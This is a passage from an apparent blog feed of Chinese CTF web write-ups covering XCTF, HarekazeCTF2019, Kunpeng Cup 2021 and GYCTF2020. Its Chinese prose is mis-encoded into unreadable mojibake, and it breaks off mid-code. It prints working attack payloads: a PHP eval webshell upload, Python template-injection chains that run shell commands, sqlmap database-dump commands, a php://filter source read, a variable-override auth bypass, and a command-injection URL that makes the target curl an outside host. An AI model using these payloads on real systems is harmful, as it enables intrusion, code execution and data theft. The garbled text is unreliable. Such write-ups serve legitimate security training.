punctuation">.</span><span class="token string">"&lt;/br>"</span><span class="token punctuation">;</span>        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'admin'</span><span class="token punctuation">]</span> <span class="token operator">=</span> True<span class="token punctuation">;</span>      <span class="token punctuation">}</span>     <span class="token delimiter">?></span></code></pre><ul><li>floatvalï¼ˆ$ _ GET [id]ï¼‰ï¼==â€˜1â€™ //æµ®ç‚¹ä¸ä¸º1</li><li>substrï¼ˆ$ _ GET [id]ï¼Œ-1ï¼‰===â€™9â€˜ //idæœ€åŽä¸€ä½ä¸º9</li></ul><pre><code>?page=1&amp;id=1â€“9&amp;submit=æäº¤æŸ¥è¯¢#</code></pre><ul><li>chdir(â€˜uploadedâ€™)//ä¿®æ”¹ä¸Šä¼ ç›®å½•åˆ°uploadedä¸‹</li></ul><p>POST:</p><pre><code> con=&lt;?php @eval($_POST['a']);?&gt;&amp;file=../1.php/.</code></pre><p>èšå‰‘è¿žæŽ¥ï¼š</p><p><img src="/2021/10/21/xctf-web-ics/6.png" alt="6"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTFï¼šWeb_python_template_injection</title>
      <link href="2021/10/21/xctf-web-python-template-injection/"/>
      <url>2021/10/21/xctf-web-python-template-injection/</url>
      
        <content type="html"><![CDATA[<pre><code>instance.__class__ å¯ä»¥èŽ·å–å½“å‰å®žä¾‹çš„ç±»å¯¹è±¡class.__mro__ èŽ·å–å½“å‰ç±»å¯¹è±¡çš„æ‰€æœ‰ç»§æ‰¿ç±»__subclasses__()è¿™ä¸ªæ–¹æ³•è¿”å›žäº†ç±»çš„æ‰€æœ‰å­˜æ´»çš„å­ç±»çš„å¼•ç”¨osæ¨¡å—éƒ½æ˜¯ä»Žwarnings.catch_warningsæ¨¡å—å…¥æ‰‹çš„ï¼Œåœ¨æ‰€æœ‰æ¨¡å—ä¸­æŸ¥æ‰¾catch_warningsçš„ä½ç½®</code></pre><h5 id="æ³•ä¸€ï¼š"><a href="#æ³•ä¸€ï¼š" class="headerlink" title="æ³•ä¸€ï¼š"></a>æ³•ä¸€ï¼š</h5><p>æŸ¥çœ‹æ‰€æœ‰æ¨¡å—ï¼š</p><pre><code>{{''.__class__.__mro__[2].__subclasses__()}}</code></pre><p><img src="/2021/10/21/xctf-web-python-template-injection/1.png" alt="image-20211021124232805"></p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}</code></pre><p><img src="/2021/10/21/xctf-web-python-template-injection/2.png" alt="image-20211021124435199"></p><pre><code>{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()}}</code></pre><h5 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h5><pre><code>{{[].__class__.__base__.__subclasses__()}}</code></pre><pre><code>{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals.keys()}}</code></pre><pre><code>{{().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("cat fl4g").read()')}}</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HarekazeCTF2019ï¼šAvatar Uploader 1</title>
      <link href="2021/10/18/harekazectf2019-avatar-uploader-1/"/>
      <url>2021/10/18/harekazectf2019-avatar-uploader-1/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019155802098.png" alt="image-20211019155802098"></p><p>è¦æ±‚ä¸Šä¼ åƒç´ å°äºŽ256*256çš„pngæ–‡ä»¶</p><p><strong>upload.php</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'config.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'lib/util.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'lib/session.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureClientSession</span><span class="token punctuation">(</span><span class="token constant">CLIENT_SESSION_ID</span><span class="token punctuation">,</span> <span class="token constant">SECRET_KEY</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// check whether file is uploaded</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'No file was uploaded.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// check file size</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256000</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded file is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// check file type</span><span class="token variable">$finfo</span> <span class="token operator">=</span> <span class="token function">finfo_open</span><span class="token punctuation">(</span><span class="token constant">FILEINFO_MIME_TYPE</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$type</span> <span class="token operator">=</span> <span class="token function">finfo_file</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">finfo_close</span><span class="token punctuation">(</span><span class="token variable">$finfo</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$type</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'image/png'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded file is not PNG format.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// check file width/height</span><span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">getimagesize</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span> <span class="token operator">||</span> <span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">256</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'Uploaded image is too large.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token constant">IMAGETYPE_PNG</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// I hope this never happens...</span>  <span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'What happened...? OK, the flag for part 1 is: &lt;code>'</span> <span class="token punctuation">.</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">'FLAG1'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/code>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// ok</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.png'</span><span class="token punctuation">;</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token constant">UPLOAD_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$session</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'avatar'</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">flash</span><span class="token punctuation">(</span><span class="token string">'info'</span><span class="token punctuation">,</span> <span class="token string">'Your avatar has been successfully updated!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>å› ä¸ºfile_infoåˆ¤æ–­ä¸ºpngï¼Œè€Œgetimagesizeåˆ¤æ–­ç»“æž„ä¸èƒ½ä¸ºpngï¼Œé€šè¿‡äº†è§£çŸ¥é“file_infoå¯ä»¥è¯†åˆ« png å›¾ç‰‡( åå…­è¿›åˆ¶ä¸‹ )çš„ç¬¬ä¸€è¡Œ,è€Œgetimagesize ä¸å¯ä»¥,æ‰€ä»¥<strong>ä¿ç•™pngæ–‡ä»¶å¤´åˆ é™¤å…¶ä½™éƒ¨åˆ†</strong>ï¼š</p><p><strong>pngæ–‡ä»¶å¤´ï¼š</strong></p><pre><code>89504e470d0a1a0a0000000d49484452</code></pre><p>åœ¨010 Editorä¸­æ‰“å¼€ï¼š</p><p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019160027989.png" alt="image-20211019160027989"></p><p>ä¸Šä¼ ï¼š</p><p><img src="/2021/10/18/harekazectf2019-avatar-uploader-1/image-20211019160104857.png" alt="image-20211019160104857"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>é²²é¹æ¯2021</title>
      <link href="2021/10/17/kun-peng-bei-2021/"/>
      <url>2021/10/17/kun-peng-bei-2021/</url>
      
        <content type="html"><![CDATA[<h1 id="CTF"><a href="#CTF" class="headerlink" title="CTF"></a>CTF</h1><h2 id="Web1ï¼šè´ªåƒè›‡"><a href="#Web1ï¼šè´ªåƒè›‡" class="headerlink" title="Web1ï¼šè´ªåƒè›‡"></a>Web1ï¼šè´ªåƒè›‡</h2><p>Dirsearch: /js/snack.js</p><p>æœ‰ä¸€ä¸²jsåˆ¤æ–­ä¸¢åˆ°æŽ§åˆ¶å°è¿è¡Œ</p><p>ç‚¹å‡»æŠ¥é”™å‘çŽ°DOMæ ‘</p><h2 id="Web2ï¼šSQL"><a href="#Web2ï¼šSQL" class="headerlink" title="Web2ï¼šSQL"></a>Web2ï¼šSQL</h2><p>sqlmap</p><pre><code>sqlmap -u "http://172.31.65.174/search.jsp?keyname=" --dbs sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns sqlmap -u "http://172.31.65.174/search.jsp?keyname=" -D attackdb --tables -T db_news --columns -C flag --dump</code></pre><h2 id="Web3ï¼šå¯è§†åŒ–ç›‘æŽ§ç®¡ç†"><a href="#Web3ï¼šå¯è§†åŒ–ç›‘æŽ§ç®¡ç†" class="headerlink" title="Web3ï¼šå¯è§†åŒ–ç›‘æŽ§ç®¡ç†"></a>Web3ï¼šå¯è§†åŒ–ç›‘æŽ§ç®¡ç†</h2><p>Dirsearch: /index.php/login/</p><p>è®¿é—®å‘çŽ°åŽå°index.php?page=index</p><pre><code>index.php?page=php://filter/convert.base64-encode/resource=index.php</code></pre><p>not the base åº”è¯¥æ˜¯è¿‡æ»¤äº† base</p><pre><code>index.php?page=php://filter/read=string.rot13/resource=index.php</code></pre><p>æŸ¥çœ‹æºç å°±æœ‰å¯†æ–‡ï¼Œè§£å¯†å¾—åˆ°æºç ï¼š</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$hashed_key</span> <span class="token operator">=</span> <span class="token string">'df01c5786c5d7d83211a8f5f22f6bdb8468e23494ad698cb86c02d128473beef765952cdd5504cbe4657a6334f6b4f7b'</span><span class="token punctuation">;</span>    <span class="token variable">$parsed</span> <span class="token operator">=</span> <span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REQUEST_URI'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//parse_urlå°†urlè§£æžåŽï¼Œè¿”å›žä¸€ä¸ªå…³è”æ•°ç»„ï¼Œæ•°ç»„ä¸­åŒ…å«queryè¿™ä¸ªå­—æ®µï¼Œç”¨æ¥å­˜å‚¨ä¼ å…¥çš„å‚æ•°å€¼ã€‚</span>    <span class="token variable">$query</span> <span class="token operator">=</span> <span class="token variable">$parsed</span><span class="token punctuation">[</span><span class="token string">"query"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//[query] => arg=valueï¼Œå°†æ•°ç»„ä¸­çš„queryå­—æ®µå€¼èµ‹ç»™å˜é‡query</span>    <span class="token variable">$parsed_query</span> <span class="token operator">=</span> <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//parse_str() å‡½æ•°ç”¨äºŽæŠŠæŸ¥è¯¢å­—ç¬¦ä¸²è§£æžåˆ°å˜é‡ä¸­ï¼Œå¦‚æžœæ²¡æœ‰array å‚æ•°ï¼Œåˆ™ç”±è¯¥å‡½æ•°è®¾ç½®çš„å˜é‡å°†è¦†ç›–å·²å­˜åœ¨çš„åŒåå˜é‡</span>    <span class="token comment" spellcheck="true">//parse_strå°†å­—ç¬¦ä¸²è§£æžæˆå¤šä¸ªå˜é‡</span>    <span class="token comment" spellcheck="true">//æ‰€æœ‰é€šè¿‡urlçš„getæ–¹æ³•ä¼ å…¥çš„å‚æ•°éƒ½ä¼šç»è¿‡parse_stræ–¹æ³•ã€‚ä½¿ä¼ å…¥çš„å‚æ•°å€¼è¦†ç›–ä¹‹å‰èµ‹çš„å€¼ï¼Œä»Žè€Œå¼•å‘å˜é‡è¦†ç›–æ¼æ´ž</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$parsed_query</span><span class="token operator">!=</span><span class="token keyword">NULL</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$action</span> <span class="token operator">=</span> <span class="token variable">$parsed_query</span><span class="token punctuation">[</span><span class="token string">'action'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$action</span><span class="token operator">===</span><span class="token string">"auth"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                         <span class="token comment" spellcheck="true">//$action="auth";</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"key"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                   <span class="token comment" spellcheck="true">//ä¼ å…¥å‚æ•°ä¸ºkey</span>        <span class="token variable">$hashed_input</span> <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">'sha384'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//ä½¿ç”¨sha384çš„å“ˆå¸Œç®—æ³•ï¼Œå°†keyå€¼è¿›è¡Œhashè¿ç®—ï¼Œç”Ÿæˆå¯¹åº”çš„å“ˆå¸Œå€¼ </span>        <span class="token comment" spellcheck="true">//echo $hashed_input.'\n';</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$hashed_input</span><span class="token operator">!==</span><span class="token variable">$hashed_key</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//hashed_input=hashed_keyæ—¶ï¼Œå¾—åˆ°flagã€‚</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"no way to get flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">//å‘çŽ°æ˜¯phpçš„å˜é‡è¦†ç›–ï¼Œè¦†ç›–action=authï¼Œkey=1ï¼Œhashed_key=sha384çš„1</span>    <span class="token punctuation">}</span>        <span class="token delimiter">?></span></code></pre><p>åˆ©ç”¨phpè„šæœ¬æ¥è®¡ç®—å‡ºhashä¸­çš„sha384ç®—æ³•1çš„hashå€¼ï¼Œç”¨æ¥è¦†ç›–ä»£ç ä¸­çš„hashå€¼ã€‚Hashå€¼éšä¾¿æž„é€ ã€‚ä»¥ä¸‹ä¸ºhashä¸­çš„sha384ç®—æ³•1çš„hashå€¼</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>        str <span class="token operator">=</span> <span class="token function">hash</span><span class="token punctuation">(</span><span class="token string">'sha384'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> str<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token comment" spellcheck="true">//47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</span></code></pre><p><strong>payload</strong></p><pre><code>index.php?action=auth&amp;key=1&amp;hashed_key=47f05d367b0c32e438fb63e6cf4a5f35c2aa2f90dc7543f8a41a0f95ce8a40a313ab5cf36134a2068c4c969cb50db776</code></pre><h1 id="AWD"><a href="#AWD" class="headerlink" title="AWD"></a>AWD</h1><h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/2021/10/17/kun-peng-bei-2021/image-20211018153408081.png" alt="image-20211018153408081"></p><p><img src="/2021/10/17/kun-peng-bei-2021/image-20211018153419396.png" alt="image-20211018153419396"></p><pre><code>backend/views/site/fun.php?a=flag&amp;b=sec&amp;cmd=curl 10.120.115.10/index.php?token=108_USR-20211016-eelbz</code></pre><p>å†™è„šæœ¬æ‰¹é‡èŽ·å–flag</p><pre><code>D:\AWD\é²²é¹æ¯æ ¡èµ›2021</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020ï¼šEz_Express</title>
      <link href="2021/10/12/gyctf2020-ez-express/"/>
      <url>2021/10/12/gyctf2020-ez-express/</url>
      
        <content type="html"><![CDATA[<p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/LEOGG321/p/13448463.html">https://www.cnblogs.com/LEOGG321/p/13448463.html</a></p><p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012184324370.png" alt="image-20211012184324370"></p><h1 id="åŽŸåž‹é“¾ä¸ŽåŽŸåž‹é“¾æ±¡æŸ“"><a href="#åŽŸåž‹é“¾ä¸ŽåŽŸåž‹é“¾æ±¡æŸ“" class="headerlink" title="åŽŸåž‹é“¾ä¸ŽåŽŸåž‹é“¾æ±¡æŸ“"></a>åŽŸåž‹é“¾ä¸ŽåŽŸåž‹é“¾æ±¡æŸ“</h1><p><a href="https://www.cnblogs.com/loveyaxin/p/11151586.html">https://www.cnblogs.com/loveyaxin/p/11151586.html</a></p><p><a href="https://www.cnblogs.com/escape-w/p/12347705.html">https://www.cnblogs.com/escape-w/p/12347705.html</a></p><p>åŽŸåž‹é“¾çš„ç‰¹æ€§ï¼š</p><p>åœ¨æˆ‘ä»¬è°ƒç”¨ä¸€ä¸ªå¯¹è±¡çš„æŸå±žæ€§æ—¶ï¼š</p><pre><code>1.å¯¹è±¡(obj)ä¸­å¯»æ‰¾è¿™ä¸€å±žæ€§2.å¦‚æžœæ‰¾ä¸åˆ°ï¼Œåˆ™åœ¨obj.__proto__ä¸­å¯»æ‰¾å±žæ€§3.å¦‚æžœä»ç„¶æ‰¾ä¸åˆ°ï¼Œåˆ™ç»§ç»­åœ¨obj.__proto__.__proto__ä¸­å¯»æ‰¾è¿™ä¸€å±žæ€§</code></pre><p>ä»¥ä¸Šæœºåˆ¶è¢«ç§°ä¸ºjsçš„prototypeç»§æ‰¿é“¾ã€‚è€ŒåŽŸåž‹é“¾æ±¡æŸ“å°±ä¸Žè¿™æœ‰å…³</p><p>åŽŸåž‹é“¾æ±¡æŸ“å®šä¹‰ï¼š</p><pre><code>å¦‚æžœæ”»å‡»è€…æŽ§åˆ¶å¹¶ä¿®æ”¹äº†ä¸€ä¸ªå¯¹è±¡çš„åŽŸåž‹ï¼Œé‚£ä¹ˆå°†å¯ä»¥å½±å“æ‰€æœ‰å’Œè¿™ä¸ªå¯¹è±¡æ¥è‡ªåŒä¸€ä¸ªç±»ã€çˆ¶ç¥–ç±»çš„å¯¹è±¡ã€‚è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯åŽŸåž‹é“¾æ±¡æŸ“</code></pre><p>çœ‹è§mergeï¼Œcloneå‡½æ•°ï¼Œå¯ä»¥å¾€åŽŸåž‹é“¾æ±¡æŸ“é </p><h1 id="toUpperCase-toLowerCase-ç»•è¿‡"><a href="#toUpperCase-toLowerCase-ç»•è¿‡" class="headerlink" title="toUpperCase()/toLowerCase()ç»•è¿‡"></a>toUpperCase()/toLowerCase()ç»•è¿‡</h1><p>Phithonçš„ä¸€ç¯‡åšå®¢ï¼š<a href="https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html">https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html</a></p><p>ç‰¹æ®Šå­—ç¬¦ç»•è¿‡</p><p>å…¶ä¸­æ··å…¥äº†ä¸¤ä¸ªå¥‡ç‰¹çš„å­—ç¬¦â€Ä±â€ã€â€Å¿â€ã€‚</p><p>è¿™ä¸¤ä¸ªå­—ç¬¦çš„â€œå¤§å†™â€æ˜¯Iå’ŒSã€‚ä¹Ÿå°±æ˜¯è¯´â€Ä±â€.toUpperCase() == â€˜Iâ€™ï¼Œâ€Å¿â€.toUpperCase() == â€˜Sâ€™ã€‚é€šè¿‡è¿™ä¸ªå°ç‰¹æ€§å¯ä»¥ç»•è¿‡ä¸€äº›é™åˆ¶ã€‚</p><p>è¿™ä¸ªâ€â„ªâ€çš„â€œå°å†™â€å­—ç¬¦æ˜¯kï¼Œä¹Ÿå°±æ˜¯â€â„ªâ€.toLowerCase() == â€˜kâ€™.</p><p><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185241629.png" alt="image-20211012185241629" style="zoom:50%;"><img src="/2021/10/12/gyctf2020-ez-express/image-20211012185302162.png" alt="image-20211012185302162" style="zoom:50%;"></p><h1 id="web-routes-index-js"><a href="#web-routes-index-js" class="headerlink" title="web\routes\index.js"></a>web\routes\index.js</h1><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> merge <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> attr <span class="token keyword">in</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isObject</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isObject</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token function">merge</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">,</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>      a<span class="token punctuation">[</span>attr<span class="token punctuation">]</span> <span class="token operator">=</span> b<span class="token punctuation">[</span>attr<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> a<span class="token punctuation">}</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> clone <span class="token operator">=</span> <span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token keyword">return</span> <span class="token function">merge</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>ä¸€ä¸ªåˆ¤æ–­ï¼Œmerge()ã€clone()å­˜åœ¨åŽŸåž‹é“¾ï¼š</p><pre class=" language-javascript"><code class="language-javascript">router<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"register"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">safeKeyword</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('forbid word');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token operator">=</span><span class="token punctuation">{</span>      <span class="token string">'user'</span><span class="token punctuation">:</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>      <span class="token string">'passwd'</span><span class="token punctuation">:</span> req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span class="token punctuation">,</span>      <span class="token string">'isLogin'</span><span class="token punctuation">:</span><span class="token boolean">false</span>    <span class="token punctuation">}</span>    res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>Submit<span class="token operator">==</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">)</span><span class="token punctuation">{</span>res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">"&lt;script>alert('register first');history.go(-1);&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>user<span class="token punctuation">.</span>user<span class="token operator">==</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>userid<span class="token operator">&amp;&amp;</span>req<span class="token punctuation">.</span>body<span class="token punctuation">.</span>pwd<span 